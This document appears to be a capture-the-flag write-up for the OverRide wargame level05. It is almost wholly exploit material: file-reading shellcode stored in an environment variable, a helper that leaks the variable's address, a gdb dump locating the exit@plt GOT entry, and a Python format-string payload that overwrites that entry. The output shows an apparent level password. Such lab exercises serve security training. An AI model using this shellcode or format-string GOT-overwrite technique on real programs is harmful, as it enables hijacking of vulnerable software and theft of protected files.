```bash
export SHELLCODE=$'\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x32\x5b\xb0\x05\x31\xc9\xcd\x80\x89\xc6\xeb\x06\xb0\x01\x31\xdb\xcd\x80\x89\xf3\xb0\x03\x83\xec\x01\x8d\x0c\x24\xb2\x01\xcd\x80\x31\xdb\x39\xc3\x74\xe6\xb0\x04\xb3\x01\xb2\x01\xcd\x80\x83\xc4\x01\xeb\xdf\xe8\xc9\xff\xff\xff/home/users/level06/.pass'
```

```bash
printf '%s\n' '#include <stdio.h>' '#include <stdlib.h>' 'int main(void){ printf("%p\n", getenv("SHELLCODE")); return 0; }' > /tmp/_tmp.c && gcc -O2 -m32 /tmp/_tmp.c -o /tmp/_tmp && /tmp/_tmp && rm -f /tmp/_tmp /tmp/_tmp.c
0xffffd8a9
```

```bash
(gdb) disas exit
Dump of assembler code for function exit@plt:
   0x08048370 <+0>:     jmp    *0x80497e0
   0x08048376 <+6>:     push   $0x18
   0x0804837b <+11>:    jmp    0x8048330
End of assembler dump.
(gdb) 
```

```bash
ffff 55457 (+8)
d8a9 10070
```

```bash
level05@OverRide:~$ python -c "print '\x08\x04\x97\xe0'[::-1] + '\x08\x04\x97\xe2'[::-1] + '%55457c%10\$hn' + '%10070c%11\$hn'+'\n'" | ./level05
�
h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
```
